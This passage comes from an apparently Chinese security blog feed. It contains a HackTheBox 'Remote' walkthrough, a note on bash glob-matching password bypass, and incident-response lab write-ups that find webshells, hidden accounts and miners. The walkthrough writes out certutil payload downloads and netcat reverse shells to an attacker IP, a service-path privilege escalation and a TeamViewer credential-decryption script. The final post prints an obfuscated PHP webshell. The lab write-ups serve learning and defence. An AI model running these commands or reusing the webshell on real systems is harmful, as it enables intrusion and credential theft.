<p><a class="link"   href="https://cn-sec.com/archives/1330676.html" >https://cn-sec.com/archives/1330676.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/zongdeiqianxing/p/13568447.html" >https://www.cnblogs.com/zongdeiqianxing/p/13568447.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://segmentfault.com/a/1190000041183119#item-1" >https://segmentfault.com/a/1190000041183119#item-1<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Remote" >https://app.hackthebox.com/machines/Remote<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：easy</p>
<p>ip：10.10.10.180</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- --min-rate=1000 -T4 10.10.10.180</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161050.png" ></p>
<p>一个一个看，开了21端口，用anonymous登陆</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161925.png" ></p>
<p>没有什么可以利用的，切换到下一个端口</p>
<p>来到80端口，是个http服务，wappalyzer识别出是Umbraco的CMS</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.21.27.png" ></p>
<p>然后找到一个登陆点</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.25.57.png"   style="zoom:25%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408162724.png"   style="zoom:50%;" >

<p>发现需要email，扫目录也没扫出什么，再看看其他端口,2049端口有nfs服务，showmount看看有什么东西</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408163102.png" ></p>
<p><code>showmount -e</code> 是 NFS 命令的一部分，用于显示远程 NFS 服务器上共享的目录列表。</p>
<p>有个目录，把它给挂载出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t nfs 10.10.10.180:/site_backups ./nfs -o nolock</span><br></pre></td></tr></table></figure>

<p><code>-t nfs</code>: 指定要挂载的文件系统类型为 NFS。</p>
<p><code>-o nolock</code>: 使用 <code>nolock</code> 选项表示禁用文件锁定机制。在某些情况下，NFS 文件系统可能会默认启用文件锁定，但是使用 <code>nolock</code> 选项可以禁用它。</p>
<p>官方给了个提示 <a class="link"   href="https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials" >这个链接<i class="fas fa-external-link-alt"></i></a>说了UmbracoCMS的密码凭据存放处，是Umbraco.sdf，在App_Data文件夹里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings Umbraco.sdf|grep admin@</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164414.png" ></p>
<p>找到了一串md5，用网站解密，解出来一串是密码</p>
<p> <img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164510.png" ></p>
<p>拿着账号密码登陆刚刚的登陆框</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@htb.local:baconandcheese</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164719.png" ></p>
<p>成功登陆后看到这个CMS的版本是7.12.4，在网上能找到相关的RCE漏洞</p>
<p>poc：<a class="link"   href="https://github.com/noraj/Umbraco-RCE.git" >https://github.com/noraj/Umbraco-RCE.git<i class="fas fa-external-link-alt"></i></a></p>
<p>下载下来后尝试命令执行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164903.png" ></p>
<p>是成功的，接下来反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c  cmd.exe -a &#x27;/c certutil.exe -urlcache -split -f http://10.10.16.3/nc64.exe C:/Users/Public/nc.exe&#x27;</span><br></pre></td></tr></table></figure>

<p><code>-urlcache</code>: 这个参数告诉 <code>certutil.exe</code> 下载指定 URL 中的内容到本地。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165113.png" ></p>
<p>下载一个nc到靶机，再调用，本地开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a &#x27;/c c:/users/public/nc.exe 10.10.16.3 4444 -e powershell&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165355.png" ></p>
<p>成功拿到第一个shell</p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>上传辅助工具winPEASx64.exe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://10.10.16.3/winPEASany.exe a.exe</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171454.png" ></p>
<p>发现用户IIS对UsoSvc服务有开启关闭权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc.exe qc UsoSvc # 查询服务详细信息</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171658.png" ></p>
<p>思路是先停止这个服务，然后修改服务中的程序路径，再重启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sc.exe stop UsoSvc</span><br><span class="line">2. sc.exe config UsoSvc binpath= &quot;c:/users/public/nc.exe 10.10.16.3 3333 -e powershell&quot;</span><br><span class="line">3. sc.exe start UsoSvc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408172259.png" ></p>
<p>然后本地开启监听，就拿到system权限，这里有个问题是这个shell会很快就断开，可以拿到后再反弹一次</p>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><p>查找本机所有正在运行的进程以及它们所托管的服务，找到<code>TeamViewer</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.30.40.png" ></p>
<p>有一个<a class="link"   href="https://www.cnblogs.com/unicodeSec/p/12294868.html" >CVE-2019-18988<i class="fas fa-external-link-alt"></i></a>，teamviewer将用户名密码硬编码至注册表中，加密算法是：<code>AES-128-CBC</code></p>
<p>其中key的值：0602000000a400005253413100040000，iv的值：0100010067244F436E6762F25EA8D704 是固定的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7</span><br></pre></td></tr></table></figure>

<p>查看TeamViewer详细信息，找到SecurityPasswordAES<code>的值</code>FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B</p>
<p>用以下脚本解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hexdump, binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESCipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, iv, data</span>):</span><br><span class="line">        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> self.cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line">key = binascii.unhexlify(<span class="string">&quot;0602000000a400005253413100040000&quot;</span>)</span><br><span class="line">iv = binascii.unhexlify(<span class="string">&quot;0100010067244F436E6762F25EA8D704&quot;</span>)</span><br><span class="line">hex_str_cipher = <span class="string">&quot;FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B&quot;</span>            <span class="comment"># output from the registry</span></span><br><span class="line"></span><br><span class="line">ciphertext = binascii.unhexlify(hex_str_cipher)</span><br><span class="line"></span><br><span class="line">raw_un = AESCipher(key).decrypt(iv, ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(raw_un))</span><br><span class="line"></span><br><span class="line">password = raw_un.decode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.57.41.png" ></p>
<p>解出密码:!R3m0te!</p>
<p>测试这个密码能否登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.180 -u administrator -p &#x27;!R3m0te!&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174116.png" ></p>
<p>是可以的，然后就用Evil-WinRM登陆，提权成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174240.png" ></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>涉及知识点：nfs挂载，poc利用，windows反弹shell，windows提权，TeamViewer提权。。。</p>
<p>整体思路：ftp找不到有用文件–&gt;80端口http服务找到CMS和登陆框–&gt;nfs服务发现文件夹，挂载出来–&gt;找到admin的账号密码–&gt;登陆CMS后发现相关版本–&gt;找到公开漏洞poc进行RCE–&gt;获得一个shell–&gt;自动化提权工具找到UsoSvc提权&#x2F;找到有Teamviewer服务用公开方法解密出脚本登陆adminitrator</p>
<p>总体思路应该算是简单的，思路不曲折，过程中接触到的东西几乎都是新的，所以写下来，以后就了解了。</p>
]]></content>
      <tags>
        <tag>复盘</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>sh脚本中==判断的几个情况</title>
    <url>/2024/04/23/sh%E8%84%9A%E6%9C%AC%E4%B8%AD-%E5%88%A4%E6%96%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E6%83%85%E5%86%B5/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>今天看到一个脚本需要爆破密码，我在已知密码是18位的情况下，妄想写个脚本去爆破，肯定是失败的，最后看到正确的脚本，我注意到里面用到*，最开始的理解是通配符绕过去了，经过shell脚本大佬·群主老师·云淡__风轻的点拨，我了解到一个关于shell脚本的知识点，有必要写个笔记记录一下。</p>
<h4 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h4><h5 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;&#x3D;绕过"></a>&#x3D;&#x3D;绕过</h5><p>先看脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == $input ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>逻辑就是定义一个password，然后我们的输入保存在input里，比较input和password看看o不ok</p>
<p>正常情况下我们要ok就应该输入‘qwe123’，和password去匹配</p>
<p>但是我们可以用到*, *在shell里叫glob，也叫通配符， *的作用可以用来匹配任何长度的任何字符，类似于正则里面的 *，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213816.png" ></p>
<p>后来了解到glob有其他字符，各自有不同的功能，比如?可以匹配任意字符串，在我知道密码长度的情况下输入n个?，也能绕过</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423213914.png" ></p>
<h5 id="没法用的情况1"><a href="#没法用的情况1" class="headerlink" title="*没法用的情况1"></a>*没法用的情况1</h5><p>如果脚本长这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == &quot;$input&quot; ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p><strong>注意到$input前后多了引号</strong>，这个时候再使用*去通配就会失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423214332.png" ></p>
<p><strong>原因是：给$input前后加上引号，会导致*没办法展开，所以通配不了，这个时候只能输入和password一模一样的字符才能ok</strong></p>
<h5 id="没法用的情况2"><a href="#没法用的情况2" class="headerlink" title="*没法用的情况2"></a>*没法用的情况2</h5><p>这个时候的脚本长这样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $input == $password ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>对比第一个脚本，在判断里面$input $password的位置调换了</p>
<p>这个东西有点抽象，群主当时给了例子</p>
<p>我自己复现了一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240423215113.png" ></p>
<p>接下来理解一下：*.txt能够代表很多个txt文件，他不能只等于1.txt，所以no，但是1.txt是 *.txt里面的一个，所以可以ok</p>
<p><strong>通俗地讲就是多个文件不能等于特定的那一个，特定的一个文件属于多个文件里</strong></p>
<p>回到input那里，我们给他输入*，就符合多个可能对应特定的一个，所以不能，所以not ok</p>
<h4 id="绕过的应用"><a href="#绕过的应用" class="headerlink" title="*绕过的应用"></a>*绕过的应用</h4><p>了解到三个用法，有这个思路就可以用来爆破密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="built_in">all</span> = <span class="built_in">list</span>(string.ascii_letters + string.digits)  <span class="comment"># 创建包含所有字母和数字的字符列表</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span>  <span class="comment"># 初始化密码为空字符串</span></span><br><span class="line">found = <span class="literal">False</span>  <span class="comment"># 初始化 found 变量为 False，表示密码尚未找到</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">				command = <span class="string">f&quot;echo &#x27;<span class="subst">&#123;password&#125;</span><span class="subst">&#123;character&#125;</span>*&#x27;｜对应的脚本操作</span></span><br><span class="line"><span class="string">        ...后续的判断</span></span><br></pre></td></tr></table></figure>

<p>command &#x3D; f”echo ‘{password}{character}*’注意这里最后就是有一个 *去通配，然后一位一位地去爆破密码</p>
<p>肯定不止这个用法，后续待更新</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>肯定是要感谢群主的耐心指导</p>
<p>这个知识点现在理解了就觉得没什么，不过还是值得记录下来的</p>
]]></content>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>htb-editorial复盘</title>
    <url>/2024/06/19/htb-editorial%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1f921fbbff15c551a8e36907d0392b10be414ddb13375860e513c883c33aeb64"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>复盘</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机-windows实战</title>
    <url>/2024/06/01/%E7%8E%84%E6%9C%BA-windows%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<h3 id="emlog"><a href="#emlog" class="headerlink" title="emlog"></a>emlog</h3><p>先远程桌面连接，用微软的remote desktop还挺方便</p>
<h4 id="找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交"><a href="#找到黑客植入-shell-将黑客植入-shell-的密码-作为-FLAG-提交" class="headerlink" title="找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;"></a>找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;</h4><p>用d盾查杀，找到shell.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601143330.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141231.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;rebeyond&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交"><a href="#分析黑客攻击成功的-IP-为多少-将黑客-IP-作为-FLAG-提交" class="headerlink" title="分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;"></a>分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141541.png" ></p>
<p>这种就是看日志，找到phpstudy路径下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601141733.png" ></p>
<p>随便一看就是192.168.126.1这个ip一直在访问shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.126.1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交"><a href="#分析黑客的隐藏账户名称-将黑客隐藏账户名称作为-FLAG-提交" class="headerlink" title="分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交"></a>分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交</h4><p>思路可以看用户表或者直接看用户目录下多了什么</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601142716.png" ></p>
<p>有个hacker138</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601142902.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hacker138&#125;</span><br></pre></td></tr></table></figure>

<h4 id="分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交"><a href="#分析黑客的挖矿程序的矿池域名-将黑客挖矿程序的矿池域名称作为-仅域名-FLAG-提交" class="headerlink" title="分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;"></a>分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</h4><p>思路是去黑客新增的用户目录下看看有什么，在桌面下发现“kuang”文件</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601143018.png" ></p>
<p>用工具反编译一下就能看到矿池域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;wakuang.zhigongshanfang.top&#125;</span><br></pre></td></tr></table></figure>

<h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><h4 id="请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss"><a href="#请提交攻击者攻击成功的第一时间，格式：flag-YY-MM-DD-hh-mm-ss" class="headerlink" title="请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}"></a>请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}</h4><p>先看日志，看nginx的日志</p>
<p>思路是看最早是什么时候出现302重定向，进入manage</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-01%2014.41.46.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023:04:29 22:45:23&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请提交攻击者的浏览器版本-flag-Firgfox-2200"><a href="#请提交攻击者的浏览器版本-flag-Firgfox-2200" class="headerlink" title="请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}"></a>请提交攻击者的浏览器版本 flag{Firgfox&#x2F;2200}</h4><p>上一道题可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Firefox/110.0&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请提交攻击者目录扫描所使用的工具名称"><a href="#请提交攻击者目录扫描所使用的工具名称" class="headerlink" title="请提交攻击者目录扫描所使用的工具名称"></a>请提交攻击者目录扫描所使用的工具名称</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601144356.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Fuzz Faster U Fool&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到攻击者写入的恶意后门文件，提交文件名（完整路径）"><a href="#找到攻击者写入的恶意后门文件，提交文件名（完整路径）" class="headerlink" title="找到攻击者写入的恶意后门文件，提交文件名（完整路径）"></a>找到攻击者写入的恶意后门文件，提交文件名（完整路径）</h4><p>用D盾查杀一下，找到.x.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601145929.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601150123.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\.x.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"><a href="#找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）" class="headerlink" title="找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）"></a>找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-06-01%2015.02.39.png" ></p>
<p>还是被D盾发现了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\usr\themes\default\post.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe"><a href="#请指出可疑进程采用的自动启动的方式，启动的脚本的名字-flag-1-exe" class="headerlink" title="请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}"></a>请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}</h4><p>windows目录下有个360.exe和x.bat（内容是”C:\Windows\360.exe”）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601150516.png" ></p>
<p>沙箱也能看到360.exe是木马</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601151153.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;x.bat&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机--webshell查杀</title>
    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-webshell%E6%9F%A5%E6%9D%80/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>护网要来了，好久没写博客了（滑跪）。前段时间朋友给了个号，做一波记录一下，一些语句和工具很值得学习。</p>
<h4 id="黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><a href="#黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx" class="headerlink" title="黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}"></a>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</h4><p>先把html文件夹下的源码下载到本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -czvf src.tar.gz ./*</span><br></pre></td></tr></table></figure>

<p>然后用d盾查杀一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240531225522.png" ></p>
<p>查看gz.php，看到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客使用的什么工具的shell-github地址的md5-flag-md5"><a href="#黑客使用的什么工具的shell-github地址的md5-flag-md5" class="headerlink" title="黑客使用的什么工具的shell github地址的md5 flag{md5}"></a>黑客使用的什么工具的shell github地址的md5 flag{md5}</h4><p>gz.php看的出来用的是哥斯拉的木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla</span><br><span class="line">md5:39392de3218c333f794befef07ac9257</span><br></pre></td></tr></table></figure>

<h4 id="黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx"><a href="#黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx" class="headerlink" title="黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx"></a>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</h4><p>D盾看到有一个.Mysqli.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/include/Db/.Mysqli.php</span><br><span class="line">md5:aebac0e58cd6c5fad1695ee4d1ac1919</span><br></pre></td></tr></table></figure>

<h4 id="黑客免杀马完整路径-md5-flag-md5"><a href="#黑客免杀马完整路径-md5-flag-md5" class="headerlink" title="黑客免杀马完整路径 md5 flag{md5}"></a>黑客免杀马完整路径 md5 flag{md5}</h4><p>d盾看到有一个top.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ERsDHgEUC1hI</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$fun</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$fun</span>[<span class="variable">$i</span>] = <span class="variable">$fun</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$s</span>.<span class="variable">$_GET</span>[<span class="string">&quot;func2&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$fun</span>);</span><br></pre></td></tr></table></figure>

<p>明显有混淆和编码</p>
